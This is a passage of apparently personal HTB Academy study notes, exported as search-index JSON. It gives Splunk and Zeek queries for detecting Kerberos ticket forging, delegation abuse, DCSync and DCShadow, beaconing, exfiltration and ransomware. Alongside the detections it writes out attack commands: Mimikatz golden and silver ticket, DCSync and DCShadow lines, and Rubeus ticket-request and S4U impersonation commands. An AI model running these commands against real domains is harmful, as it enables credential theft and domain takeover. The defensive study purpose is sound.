Request)</code>. However, communication with the DC (<code>TCP/UDP port 88</code>) from an unusual process can serve as an indicator of a potential Overpass-the-Hash attack.</p> <p>Detecting Overpass-the-Hash With Splunk (Targeting Rubeus)</p> <pre><code>index=main earliest=1690443407 latest=1690443544 source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" (EventCode=3 dest_port=88 Image!=*lsass.exe) OR EventCode=1\n| eventstats values(process) as process by process_id\n| where EventCode=3\n| stats count by _time, Computer, dest_ip, dest_port, Image, process\n| fields - count\n</code></pre> <p>Event ID 3: Network connection detected</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-golden-ticketssilver-tickets", "title": "Detecting Golden Tickets/Silver Tickets", "text": "<p>A Golden Ticket attack is a potent method where an attacker forges a Ticket Granting Ticket (TGT) to gain unauthorized access to a Windows Active Directory domain as a domain administrator. The attacker creates a TGT with arbitrary user credentials and then uses this forged ticket to impersonate a domain administrator, thereby gaining full control over the domain. The Golden Ticket attack is stealthy and persistent, as the forged ticket has a long validity period and remains valid until it expires or is revoked.</p> <p>Golden Tickets Attack Steps:</p> <ol> <li> <p>The attacker extracts the NTLM hash of the KRBTGT account using a <code>DCSync</code> attack (alternatively, they can use <code>NTDS.dit</code> and <code>LSASS process dumps</code> on the Domain Controller).</p> </li> <li> <p>Armed with the <code>KRBTGT</code> hash, the attacker forges a TGT for an arbitrary user account, assigning it domain administrator privileges.</p> <p>``` mimikatz # kerberos::golden /domain:lab.internal.local /sid: /rc4: /user:EvilAdmin /ptt <p>klist ``` 3. The attacker injects the forged TGT in the same manner as a Pass-the-Ticket attack.</p> <p>Golden Ticket Detection Opportunities</p> <p>Detecting Golden Ticket attacks can be challenging, as the TGT can be forged offline by an attacker, leaving virtually no traces of <code>Mimikatz</code> execution. One option is to monitor common methods of extracting the <code>KRBTGT</code> hash:</p> <ul> <li>DCSync attack</li> <li>NTDS.dit file access</li> <li>LSASS memory read on the domain controller (Sysmon Event ID 10)</li> </ul> <p>From another standpoint, a Golden Ticket is just another ticket for Pass-the-Ticket detection.</p> <p>Detecting Golden Tickets With Splunk (Yet Another Ticket To Be Passed Approach)</p> <pre><code>index=main earliest=1690451977 latest=1690452262 source=\"WinEventLog:Security\" user!=*$ EventCode IN (4768,4769,4770) \n| rex field=user \"(?&lt;username&gt;[^@]+)\"\n| rex field=src_ip \"(\\:\\:ffff\\:)?(?&lt;src_ip_4&gt;[0-9\\.]+)\"\n| transaction username, src_ip_4 maxspan=10h keepevicted=true startswith=(EventCode=4768)\n| where closed_txn=0\n| search NOT user=\"*$@*\"\n| table _time, ComputerName, username, src_ip_4, service_name, category\n</code></pre> <p>Silver Ticket</p> <p>Adversaries who possess the password hash of a target service account (e.g., SharePoint, MSSQL) may forge Kerberos Ticket Granting Service (TGS) tickets, also known as Silver Tickets. Silver tickets can be used to impersonate any user, but they are more limited in scope than Golden Tickets, as they only allow adversaries to access a specific resource (e.g., MSSQL) and the system hosting the resource.</p> <p>Silver Ticket Attack Steps:</p> <ol> <li> <p>The attacker extracts the NTLM hash of the targeted service account (or the computer account for <code>CIFS</code> access) using tools like <code>Mimikatz</code> or other credential dumping techniques.</p> </li> <li> <p>Generate a Silver Ticket: Using the extracted NTLM hash, the attacker employs tools like <code>Mimikatz</code> to create a forged TGS ticket for the specified service.</p> </li> </ol> <pre><code>.\\mimikatz.exe\n\nmimikatz # kerberos::golden /sid:&lt;&gt; /id:500 /target:iis.lab.internal.local /service:CIFS /domain:lab.internal.local /rc4:&lt;&gt; /user:DarthKittius /ptt\nmimikatz # exit\n\nklist\n</code></pre> <ol> <li>The attacker injects the forged TGT in the same manner as a Pass-the-Ticket attack.</li> </ol> <p>Silver Ticket Detection Opportunities</p> <p>Detecting forged service tickets (TGS) can be challenging, as there are no simple indicators of attack. In both Golden Ticket and Silver Ticket attacks, arbitrary users can be used, <code>including non-existent ones. Event ID 4720 (A user account was created)</code> can help identify newly created users. Subsequently, we can compare this user list with logged-in users.</p> <p>Because there is no validation for user permissions, users can be granted administrative permissions. <code>Event ID 4672 (Special Logon)</code> can be employed to detect anomalously assigned privileges.</p> <p>Detecting Silver Tickets With Splunk</p> <ul> <li> <p>Detecting Silver Tickets With Splunk Through User Correlation</p> </li> <li> <p>Let's first create a list of users (users.csv) leveraging Event ID 4720 (A user account was created) as follows.</p> </li> </ul> <pre><code>index=main latest=1690448444 EventCode=4720\n| stats min(_time) as _time, values(EventCode) as EventCode by user\n| outputlookup users.csv\n</code></pre> <p>Note: <code>users.csv</code> can be downloaded from the <code>Resources</code> section of this module (upper right corner) and uploaded to Splunk by clicking Settings -&gt; Lookups -&gt; Lookup table files -&gt; New Lookup Table File.</p> <ol> <li>Let's now compare the list above with logged-in users as follows.</li> </ol> <pre><code>index=main latest=1690545656 EventCode=4624\n| stats min(_time) as firstTime, values(ComputerName) as ComputerName, values(EventCode) as EventCode by user\n| eval last24h = 1690451977\n| where firstTime &gt; last24h\n```| eval last24h=relative_time(now(),\"-24h@h\")```\n| convert ctime(firstTime)\n| convert ctime(last24h)\n| lookup users.csv user as user OUTPUT EventCode as Events\n| where isnull(Events)\n</code></pre> <p><code>| eval last24h=relative_time(now(),\"-24h@h\")</code>: This command (commented out) would redefine the last24h variable to be exactly 24 hours before the current time. Note that this line is commented out with backticks, so it will not be executed in this search.</p> <ul> <li>Detecting Silver Tickets With Splunk By Targeting Special Privileges Assigned To New Logon</li> </ul> <pre><code>index=main latest=1690545656 EventCode=4672\n| stats min(_time) as firstTime, values(ComputerName) as ComputerName by Account_Name\n| eval last24h = 1690451977 \n```| eval last24h=relative_time(now(),\"-24h@h\") ```\n| where firstTime &gt; last24h \n| table firstTime, ComputerName, Account_Name \n| convert ctime(firstTime)\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-unconstrained-delegationconstrained-delegation-attacks", "title": "Detecting Unconstrained Delegation/Constrained Delegation Attacks", "text": "<p>Unconstrained Delegation is a privilege that can be granted to User Accounts or Computer Accounts in an Active Directory environment, allowing a service to authenticate to another resource on behalf of any user. This might be necessary when, for example, a web server requires access to a database server to make changes on a user's behalf.</p> <p>Attack Steps:</p> <ol> <li> <p>The attacker identifies systems on which Unconstrained Delegation is enabled for service accounts.</p> <p><code>Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroundid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description</code></p> </li> <li> <p>The attacker gains access to a system with Unconstrained Delegation enabled.</p> </li> <li> <p>The attacker extracts Ticket Granting Ticket (TGT) tickets from the memory of the compromised system using tools such as Mimikatz.</p> <p><code>.\\Rubeus.exe asktgt /user:Administrator /domain:lab.internal.local /rc4:&lt;NTLM hash&gt; ptt</code></p> </li> </ol> <p>Unconstrained Delegation Attack Detection Opportunities</p> <p>PowerShell commands and LDAP search filters used for Unconstrained Delegation discovery can be detected by monitoring PowerShell script block logging (<code>Event ID 4104</code>) and LDAP request logging.</p> <p>The main goal of an Unconstrained Delegation attack is to retrieve and reuse TGT tickets, so Pass-the-Ticket detection can be used as well.</p> <p>Detecting Unconstrained Delegation Attacks With Splunk</p> <pre><code>index=main earliest=1690544538 latest=1690544540 source=\"WinEventLog:Microsoft-Windows-PowerShell/Operational\" EventCode=4104 Message=\"*TrustedForDelegation*\" OR Message=\"*userAccountControl:1.2.840.113556.1.4.803:=524288*\" \n| table _time, ComputerName, EventCode, Message\n</code></pre> <p>Constrained Delegation is a feature in Active Directory that allows services to delegate user credentials only to specified resources, reducing the risk associated with Unconstrained Delegation. Any user or computer accounts that have service principal names (SPNs) set in their msDS-AllowedToDelegateTo property can impersonate any user in the domain to those specific SPNs.</p> <p>Attack Steps:</p> <ol> <li> <p>The attacker identifies systems where Constrained Delegation is enabled and determines the resources to which they are allowed to delegate.</p> <p><code>Get-ADObject -fi {(msDS-AllowedToDelegateTo -like \"*\")}</code></p> </li> <li> <p>The attacker gains access to the TGT of the principal (user or computer). The TGT can be extracted from memory (Rubeus dump) or requested with the principal's hash.</p> <p><code>.\\Rubeus.exe asktgt /user:Backup /domain:lab.internal.local /password:B@ckup1234 /outfile:ticket.kirbi</code></p> </li> <li> <p>The attacker uses the S4U technique to impersonate a high-privileged account to the targeted service (requesting a TGS ticket).</p> <p><code>.\\Rubeus.exe s4u /ticket:ticket.kirbi /impersonateuser:WELDON_EVANS /domain:lab.internal.local /msdsspn:ldap/dc.lab.internal.local /altservice:cifs /ptt</code></p> </li> <li> <p>The attacker injects the requested ticket and accesses targeted services as the impersonated user.</p> <p><code>klist</code></p> </li> </ol> <p>Kerberos Protocol Extensions - Service For User</p> <p><code>Service for User to Self (S4U2self)</code> and <code>Service for User to Proxy (S4U2proxy)</code> allow a service to request a ticket from the Key Distribution Center (KDC) on behalf of a user. S4U2self allows a service to obtain a TGS for itself on behalf of a user, while S4U2proxy allows the service to obtain a TGS on behalf of a user for a second service.</p> <p>S4U2self was designed to enable a user to request a TGS ticket when another method of authentication was used instead of Kerberos. Importantly, this TGS ticket can be requested on behalf of any user, for example, an Administrator.`</p> <p>S4U2proxy was designed to take a forwardable ticket and use it to request a TGS ticket to any SPN specified in the <code>msds-allowedtodelegateto</code> options for the user specified in the S4U2self part.</p> <p>With a combination of S4U2self and S4U2proxy, an attacker can impersonate any user to service principal names (SPNs) set in <code>msDS-AllowedToDelegateTo</code> properties.</p> <p>Constrained Delegation Attack Detection Opportunities</p> <p>Similar to Unconstrained Delegation, it is possible to detect PowerShell commands and LDAP requests aimed at discovering vulnerable Constrained Delegation users and computers.</p> <p>To request a TGT ticket for a principal, as well as a TGS ticket using the S4U technique, Rubeus makes connections to the Domain Controller. This activity can be detected as an unusual process network connection to TCP/UDP port <code>88</code> (Kerberos).</p> <p>Detecting Constrained Delegation Attacks With Splunk</p> <ul> <li>Detecting Constrained Delegation Attacks - Leveraging PowerShell Logs</li> </ul> <pre><code>index=main earliest=1690544553 latest=1690562556 source=\"WinEventLog:Microsoft-Windows-PowerShell/Operational\" EventCode=4104 Message=\"*msDS-AllowedToDelegateTo*\" \n| table _time, ComputerName, EventCode, Message\n</code></pre> <p>Event Id 4104 (script block logging), it will capture PowerShell commands and show script block logging.</p> <ul> <li>Detecting Constrained Delegation Attacks - Leveraging Sysmon Logs</li> </ul> <pre><code>index=main earliest=1690562367 latest=1690562556 source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" \n| eventstats values(process) as process by process_id\n| where EventCode=3 AND dest_port=88\n| table _time, Computer, dest_ip, dest_port, Image, process\n</code></pre> <p>Event Id 3: Network connection detected</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-dcsyncdcshadow", "title": "Detecting DCSync/DCShadow", "text": "<p>DCSync is a technique exploited by attackers to extract password hashes from Active Directory Domain Controllers (DCs). This method capitalizes on the Replication Directory Changes permission typically granted to domain controllers, enabling them to read all object attributes, including password hashes. Members of the Administrators, Domain Admins, and Enterprise Admin groups, or computer accounts on the domain controller, have the capability to execute DCSync to extract password data from Active Directory. This data may encompass both current and historical hashes of potentially valuable accounts, such as KRBTGT and Administrators.</p> <p>Attack Steps:</p> <ol> <li> <p>The attacker secures administrative access to a domain-joined system or escalates privileges to acquire the requisite rights to request replication data.</p> </li> <li> <p>Utilizing tools such as Mimikatz, the attacker requests domain replication data by using the DRSGetNCChanges interface, effectively mimicking a legitimate domain controller.</p> <p><code>mimikatz # lsadump::dcsync /domain:lab.internal.local /user:krbtgt</code></p> </li> <li> <p>The attacker may then craft Golden Tickets, Silver Tickets, or opt to employ Pass-the-Hash/Overpass-the-Hash attacks.</p> </li> </ol> <p>DCSync Detection Opportunities</p> <p><code>DS-Replication-Get-Changes</code> operations can be recorded with <code>Event ID 4662</code>. However, an additional <code>Audit Policy Configuration</code> is needed since it is not enabled by default (Computer Configuration/Windows Settings/Security Settings/Advanced Audit Policy Configuration/DS Access).</p> <p>Seek out events containing the property <code>{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}</code>, corresponding to <code>DS-Replication-Get-Changes</code>, as Event <code>4662</code> solely consists of GUIDs.</p> <p>Event ID 4622: A security package has been loaded by the Local Security Authority.</p> <p>Detecting DCSync With Splunk</p> <pre><code>index=main earliest=1690544278 latest=1690544280 EventCode=4662 Message=\"*Replicating Directory Changes*\"\n| rex field=Message \"(?P&lt;property&gt;Replicating Directory Changes.*)\"\n| table _time, user, object_file_name, Object_Server, property\n</code></pre> <p>DCShadow is an advanced tactic employed by attackers to enact unauthorized alterations to Active Directory objects, encompassing the creation or modification of objects without producing standard security logs. The assault harnesses the Directory Replicator (Replicating Directory Changes) permission, customarily granted to domain controllers for replication tasks. DCShadow is a clandestine technique enabling attackers to manipulate Active Directory data and establish persistence within the network. Registration of a rogue DC necessitates the creation of new server and nTDSDSA objects in the Configuration partition of the AD schema, which demands Administrator privileges (either Domain or local to the DC) or the KRBTGT hash.</p> <p>Attack Steps:</p> <ol> <li> <p>The attacker secures administrative access to a domain-joined system or escalates privileges to acquire the necessary rights to request replication data.</p> </li> <li> <p>The attacker registers a rogue domain controller within the domain, leveraging the <code>Directory Replicator</code> permission, and executes changes to AD objects, such as modifying user groups to Domain Administrator groups.</p> <p><code>mimikatz # token::whoami mimikatz # lsadump::dcshadow /object:JENNY_HICKMAN /attribute:primaryGroupID /value:512</code> 3. The rogue domain controller initiates replication with the legitimate domain controllers, disseminating the changes throughout the domain.</p> <p><code>mimikatz # lsadump::dcshadow /push</code></p> </li> </ol> <p>DCShadow Detection Opportunities</p> <p>To emulate a Domain Controller, DCShadow must implement specific modifications in Active Directory:</p> <ul> <li> <p>Add a new nTDSDSA object</p> </li> <li> <p>Append a global catalog ServicePrincipalName to the computer object</p> </li> </ul> <p><code>Event ID 4742 (Computer account was changed)</code> logs changes related to computer objects, including <code>ServicePrincipalName</code>.</p> <p>Detecting DCShadow With Splunk</p> <pre><code>index=main earliest=1690623888 latest=1690623890 EventCode=4742 \n| rex field=Message \"(?P&lt;gcspn&gt;GC\\/[a-zA-Z0-9\\.\\-\\/]+)\" \n| table _time, ComputerName, Security_ID, Account_Name, user, gcspn \n| search gcspn=*\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-rdp-brute-force-attacks", "title": "Detecting RDP Brute Force Attacks", "text": "<p>We often encounter Remote Desktop Protocol (RDP) brute force attacks as a favorite vector for attackers to gain initial foothold in a network. The concept of an RDP brute force attack is relatively straightforward: attackers attempt to login into a Remote Desktop session by systematically guessing and trying different passwords until they find the correct one. This method exploits the fact that many users often have weak or default passwords that are easy to guess.</p> <p>Detecting RDP Brute Force Attacks With Splunk &amp; Zeek Logs</p> <p>Related Evidence:</p> <ul> <li> <p>Related Directory: <code>/home/htb-student/module_files/rdp_bruteforce</code></p> </li> <li> <p>Related Splunk Index: <code>rdp_bruteforce</code></p> </li> <li> <p>Related Splunk Sourcetype: <code>bro:rdp:json</code></p> </li> </ul> <pre><code>index=\"rdp_bruteforce\" sourcetype=\"bro:rdp:json\"\n| bin _time span=5m\n| stats count values(cookie) by _time, id.orig_h, id.resp_h\n| where count&gt;30\n</code></pre> <p>Q: Construct a Splunk query targeting the \"ssh_bruteforce\" index and the \"bro:ssh:json\" sourcetype. The resulting output should display the time bucket, source IP, destination IP, client, and server, together with the cumulative count of authentication attempts where the total number of attempts surpasses 30 within a 5-minute time window. Enter the IP of the client that performed the SSH brute attack as your answer.</p> <pre><code>index=\"ssh_bruteforce\" sourcetype=\"bro:ssh:json\"\n| bin _time span=5m\n| stats count as auth_attempts by _time, src, dest, client, server\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-beaconing-malware", "title": "Detecting Beaconing Malware", "text": "<p>Malware beaconing is a technique we frequently encounter in our cybersecurity investigations. It refers to the periodic communication initiated by malware-infected systems with their respective command and control (C2) servers. The beacons, typically small data packets, are sent at regular intervals, much like a lighthouse sends out a regular signal.</p> <p>In our analysis of beaconing behavior, we often observe several distinct patterns. The beaconing intervals can be fixed, jittered (varied slightly from a fixed pattern), or follow a more complex schedule based on the malware's specific objectives. We've encountered malware that uses various protocols for beaconing, including HTTP/HTTPS, DNS, and even ICMP (ping).</p> <p>Detecting Beaconing Malware With Splunk &amp; Zeek Logs</p> <pre><code>index=\"cobaltstrike_beacon\" sourcetype=\"bro:http:json\" \n| sort 0 _time\n| streamstats current=f last(_time) as prevtime by src, dest, dest_port\n| eval timedelta = _time - prevtime\n| eventstats avg(timedelta) as avg, count as total by src, dest, dest_port\n| eval upper=avg*1.1\n| eval lower=avg*0.9\n| where timedelta &gt; lower AND timedelta &lt; upper\n| stats count, values(avg) as TimeInterval by src, dest, dest_port, total\n| eval prcnt = (count/total)*100\n| where prcnt &gt; 90 AND total &gt; 10\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-nmap-port-scanning", "title": "Detecting Nmap Port Scanning", "text": "<p>Detecting Nmap Port Scanning With Splunk &amp; Zeek Logs</p> <pre><code>index=\"cobaltstrike_beacon\" sourcetype=\"bro:conn:json\" orig_bytes=0 dest_ip IN (192.168.0.0/16, 172.16.0.0/12, 10.0.0.0/8) \n| bin span=5m _time \n| stats dc(dest_port) as num_dest_port by _time, src_ip, dest_ip \n| where num_dest_port &gt;= 3\n</code></pre> <p>Q: Use the \"cobaltstrike_beacon\" index and the \"bro:conn:json\" sourcetype. Did the attacker scan port 505? Answer format: Yes, No</p> <pre><code>index=\"cobaltstrike_beacon\" sourcetype=\"bro:conn:json\" orig_bytes=0 dest_ip IN (192.168.0.0/16, 172.16.0.0/12, 10.0.0.0/8) \n| table _time, src_ip, dest_ip, dest_port \n| where dest_port=505\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-kerberos-brute-force-attacks", "title": "Detecting Kerberos Brute Force Attacks", "text": "<p>When adversaries perform Kerberos-based user enumeration, they send an AS-REQ (Authentication Service Request) message to the Key Distribution Center (KDC), which is responsible for handling Kerberos authentication. This message includes the username they're trying to validate. They pay close attention to the response they receive, as it reveals valuable information about the existence of the specified user account.</p> <p>A valid username will prompt the server to return a TGT or raise an error like KRB5KDC_ERR_PREAUTH_REQUIRED, indicating that preauthentication is required. On the other hand, an invalid username will be met with a Kerberos error code KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN in the AS-REP (Authentication Service Response) message. By examining the responses to their AS-REQ messages, adversaries can quickly determine which usernames are valid on the target system.</p> <p>Detecting Kerberos Brute Force Attacks With Splunk &amp; Zeek Logs</p> <pre><code>index=\"kerberos_bruteforce\" sourcetype=\"bro:kerberos:json\"\nerror_msg!=KDC_ERR_PREAUTH_REQUIRED\nsuccess=\"false\" request_type=AS\n| bin _time span=5m\n| stats count dc(client) as \"Unique users\" values(error_msg) as \"Error messages\" by _time, id.orig_h, id.resp_h\n| where count&gt;30\n</code></pre> <pre><code>index=\"kerberos_bruteforce\" sourcetype=\"bro:kerberos:json\" error_msg!=KDC_ERR_PREAUTH_REQUIRED\nsuccess=\"false\" request_type=AS\n| bin _time span=5m\n| table client,id.orig_h, id.resp_h\n| where client=\"accrescent/windomain.local\"\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-kerberoasting", "title": "Detecting Kerberoasting", "text": "<p>Evidence Source: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting</p> <p>Detecting Kerberoasting With Splunk &amp; Zeek Logs</p> <pre><code>index=\"sharphound\" sourcetype=\"bro:kerberos:json\"\nrequest_type=TGS cipher=\"rc4-hmac\" \nforwardable=\"true\" renewable=\"true\"\n| table _time, id.orig_h, id.resp_h, request_type, cipher, forwardable, renewable, client, service\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-golden-tickets", "title": "Detecting Golden Tickets", "text": "<p>Detecting Golden Tickets With Splunk &amp; Zeek Logs</p> <pre><code>index=\"golden_ticket_attack\" sourcetype=\"bro:kerberos:json\"\n| where client!=\"-\"\n| bin _time span=1m \n| stats values(client), values(request_type) as request_types, dc(request_type) as unique_request_types by _time, id.orig_h, id.resp_h\n| where request_types==\"TGS\" AND unique_request_types==1\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-cobalt-strikes-psexec", "title": "Detecting Cobalt Strike's PSExec", "text": "<p>Image Source: https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/</p> <p>Detecting Cobalt Strike's PSExec With Splunk &amp; Zeek Logs</p> <pre><code>index=\"cobalt_strike_psexec\"\nsourcetype=\"bro:smb_files:json\"\naction=\"SMB::FILE_OPEN\" \nname IN (\"*.exe\", \"*.dll\", \"*.bat\")\npath IN (\"*\\\\c$\", \"*\\\\ADMIN$\")\nsize&gt;0\n</code></pre> <p>Q: Use the \"change_service_config\" index and the \"bro:dce_rpc:json\" sourcetype to create a Splunk search that will detect SharpNoPSExec (https://gist.github.com/defensivedepth/ae3f882efa47e20990bc562a8b052984). Enter the IP included in the \"id.orig_h\" field as your answer.</p> <pre><code>index=\"change_service_config\"\nsourcetype=\"bro:dce_rpc:json\"\noperation IN (\"ChangeServiceConfigW\", \"StartServiceA\")\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-zerologon", "title": "Detecting Zerologon", "text": "<p>The Zerologon vulnerability, also known as CVE-2020-1472, is a critical flaw in the implementation of the Netlogon Remote Protocol, specifically in the cryptographic algorithm used by the protocol. The vulnerability can be exploited by an attacker to impersonate any computer, including the domain controller, and execute remote procedure calls on their behalf. Let's dive into the technical details of this flaw.</p> <p>Image Source: https://www.trendmicro.com/en_us/what-is/zerologon.html</p> <p>Detecting Zerologon With Splunk &amp; Zeek Logs</p> <pre><code>index=\"zerologon\" endpoint=\"netlogon\" sourcetype=\"bro:dce_rpc:json\"\n| bin _time span=1m\n| where operation == \"NetrServerReqChallenge\" OR operation == \"NetrServerAuthenticate3\" OR operation == \"NetrServerPasswordSet2\"\n| stats count values(operation) as operation_values dc(operation) as unique_operations by _time, id.orig_h, id.resp_h\n| where unique_operations &gt;= 2 AND count&gt;100\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-exfiltration-http", "title": "Detecting Exfiltration (HTTP)", "text": "<p>Data exfiltration inside the POST body is a technique that attackers employ to extract sensitive information from a compromised system by disguising it as legitimate web traffic. It involves transmitting the stolen data from the compromised system to an external server controlled by the attacker using HTTP POST requests. Since POST requests are commonly used for legitimate purposes, such as form submissions and file uploads, this method of data exfiltration can be difficult to detect.</p> <p>Detecting HTTP Exfiltration With Splunk &amp; Zeek Logs</p> <pre><code>index=\"cobaltstrike_exfiltration_http\" sourcetype=\"bro:http:json\" method=POST\n| stats sum(request_body_len) as TotalBytes by src, dest, dest_port\n| eval TotalBytes = TotalBytes/1024/1024\n</code></pre> <p>Q: Use the \"cobaltstrike_exfiltration_https\" index and the \"bro:conn:json\" sourcetype. Create a Splunk search to identify exfiltration through HTTPS. Enter the identified destination IP as your answer.</p> <pre><code>index=\"cobaltstrike_exfiltration_https\" sourcetype=\"bro:conn:json\" proto=\"tcp\" service=\"ssl\"\n| eval total_bytes = resp_bytes + orig_bytes\n| stats sum(total_bytes) as total_data_transferred, count by id.resp_h\n| where total_data_transferred &gt; 10000000\n| sort -total_data_transferred\n| table id.resp_h, total_data_transferred, count\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-exfiltration-dns", "title": "Detecting Exfiltration (DNS)", "text": "<p>Attackers employ DNS-based exfiltration due to its reliability, stealthiness, and the fact that DNS traffic is often allowed by default in network firewall rules. By embedding data within DNS queries and responses, attackers can bypass security controls and exfiltrate data covertly. </p> <p>How DNS Exfiltration Works:</p> <p>Initial Compromise: The attacker gains access to the victim's network, typically through malware, phishing, or exploiting vulnerabilities.</p> <p>Data Identification and Preparation: The attacker locates the data they want to exfiltrate and prepares it for transmission. This usually involves encoding or encrypting the data and splitting it into small chunks.</p> <p>Exfiltration via DNS: The attacker sends the data in the subdomains of DNS queries, utilizing techniques such as DNS tunneling or fast flux. They typically use a domain under their control or a compromised domain for this purpose. The attacker's DNS server receives the queries, extracts the data, and reassembles it.</p> <p>Data Retrieval and Analysis: After exfiltration, the attacker decodes or decrypts the data and analyzes it.</p> <p>Detecting DNS Exfiltration With Splunk &amp; Zeek Logs</p> <pre><code>index=dns_exf sourcetype=\"bro:dns:json\"\n| eval len_query=len(query)\n| search len_query&gt;=40 AND query!=\"*.ip6.arpa*\" AND query!=\"*amazonaws.com*\" AND query!=\"*._googlecast.*\" AND query!=\"_ldap.*\"\n| bin _time span=24h\n| stats count(query) as req_by_day by _time, id.orig_h, id.resp_h\n| where req_by_day&gt;60\n| table _time, id.orig_h, id.resp_h, req_by_day\n</code></pre> <p>Q: Use the \"dns_exf\" index and the \"bro:dns:json\" sourcetype. Enter the attacker-controlled domain as your answer. Answer format: .</p> <pre><code>index=\"dns_exf\" sourcetype=\"bro:dns:json\"\n| stats count by query\n| where count &gt; 100\n| sort -count\n| table query, count\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-ransomware", "title": "Detecting Ransomware", "text": "<p>Detecting Ransomware With Splunk &amp; Zeek Logs (Excessive Overwriting)</p> <pre><code>index=\"ransomware_open_rename_sodinokibi\" sourcetype=\"bro:smb_files:json\" \n| where action IN (\"SMB::FILE_OPEN\", \"SMB::FILE_RENAME\")\n| bin _time span=5m\n| stats count by _time, source, action\n| where count&gt;30 \n| stats sum(count) as count values(action) dc(action) as uniq_actions by _time, source\n| where uniq_actions==2 AND count&gt;100\n</code></pre> <p>Detecting Ransomware With Splunk &amp; Zeek Logs (Excessive Renaming With The Same Extension)</p> <pre><code>index=\"ransomware_new_file_extension_ctbl_ocker\" sourcetype=\"bro:smb_files:json\" action=\"SMB::FILE_RENAME\" \n| bin _time span=5m\n| rex field=\"name\" \"\\.(?&lt;new_file_name_extension&gt;[^\\.]*$)\"\n| rex field=\"prev_name\" \"\\.(?&lt;old_file_name_extension&gt;[^\\.]*$)\"\n| stats count by _time, id.orig_h, id.resp_p, name, source, old_file_name_extension, new_file_name_extension,\n| where new_file_name_extension!=old_file_name_extension\n| stats count by _time, id.orig_h, id.resp_p, source, new_file_name_extension\n| where count&gt;20\n| sort -count\n</code></pre> <p>Q: Modify the action-related part of the Splunk search of this section that detects excessive file overwrites so that it detects ransomware that delete the original files instead of overwriting them. Run this search against the \"ransomware_excessive_delete_aleta\" index and the \"bro:smb_files:json\" sourcetype. Enter the value of the \"count\" field as your answer.</p> <pre><code>index=\"ransomware_excessive_delete_aleta\" sourcetype=\"bro:smb_files:json\"\n| where action IN (\"SMB::FILE_OPEN\", \"SMB::FILE_DELETE\")\n| bin _time span=5m\n| stats count by _time, source, action\n| where count &gt; 30\n| stats sum(count) as count values(action) as actions dc(action) as uniq_actions by _time, source\n| where uniq_actions==2 AND count &gt; 100\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#skills-assessment_3", "title": "Skills Assessment", "text": "<p>Q1: Use the \"empire\" index and the \"bro:http:json\" sourcetype. Identify beaconing activity by modifying the Splunk search of the \"Detecting Beaconing Malware\" section and enter the value of the \"TimeInterval\" field as your answer.</p> <pre><code>index=\"empire\" sourcetype=\"bro:http:json\" \n| sort 0 _time\n| streamstats current=f last(_time) as prevtime by src, dest, dest_port\n| eval timedelta = _time - prevtime\n| eventstats avg(timedelta) as avg, count as total by src, dest, dest_port\n| eval upper=avg*1.1\n| eval lower=avg*0.9\n| where timedelta &gt; lower AND timedelta &lt; upper\n| stats count, values(avg) as TimeInterval by src, dest, dest_port, total\n</code></pre> <p>Q2: Use the \"printnightmare\" index and the \"bro:dce_rpc:json\" sourcetype to create a Splunk search that will detect possible exploitation of the PrintNightmare vulnerability. Enter the IP included in the \"id.orig_h\" field as your answer.</p> <pre><code>index=\"printnightmare\" sourcetype=\"bro:dce_rpc:json\"\n| where endpoint IN (\"spoolss\", \"MS-RPRN\", \"MS-PAR\")\n| stats count by _time, id.orig_h, id.resp_h, endpoint, operation\n| sort -count\n</code></pre> <p>Q3: Use the \"bloodhound_all_no_kerberos_sign\" index and the \"bro:dce_rpc:json\" sourcetype to create a Splunk search that will detect possible BloodHound activity (https://www.lares.com/blog/active-directory-ad-attacks-enumeration-at-the-network-layer/). Enter the IP included in the \"id.orig_h\" field as your answer.</p> <pre><code>index=\"bloodhound_all_no_kerberos_sign\" sourcetype=\"bro:dce_rpc:json\"\n| where endpoint IN (\"samr\", \"lsarpc\") \n| stats count by operation, id.orig_h, id.resp_h, endpoint\n| sort -count\n</code></pre>"}, {"location": "HTB/Academy/Web%20requests/", "title": "Web requests", "text": ""}, {"location": "HTB/Academy/Web%20requests/#web-headers", "title": "Web Headers", "text": "<p>Finally, we have Security Headers. With the increase in the variety of browsers and web-based attacks, defining certain headers that enhanced security was necessary. HTTP Security headers are a class of response headers used to specify certain rules and policies to be followed by the browser while accessing the website.</p> Header Example Description Content-Security-Policy Content-Security-Policy: script-src 'self'    Dictates the website's policy towards externally injected resources. This could be JavaScript code as well as script resources. This header instructs the browser to accept resources only from certain trusted domains, hence preventing attacks such as Cross-site scripting (XSS). Strict-Transport-Security Strict-Transport-Security: max-age=31536000 Prevents the browser from accessing the website over the plaintext HTTP protocol, and forces all communication to be carried over the secure HTTPS protocol. This prevents attackers from sniffing web traffic and accessing protected information such as passwords or other sensitive data. Referrer-Policy Referrer-Policy: origin Dictates whether the browser should include the value specified via the Referer header or not. It can help in avoiding disclosing sensitive URLs and information while browsing the website. <p>Note: This section only mentions a small subset of commonly seen HTTP headers. There are many other contextual headers that can be used in HTTP communications. It's also possible for applications to define custom headers based on their requirements. A complete list of standard HTTP headers can be found here.</p> <p>We can use the -I flag to send a HEAD request and only display the response headers. Furthermore, we can use the -i flag to display both the headers and the response 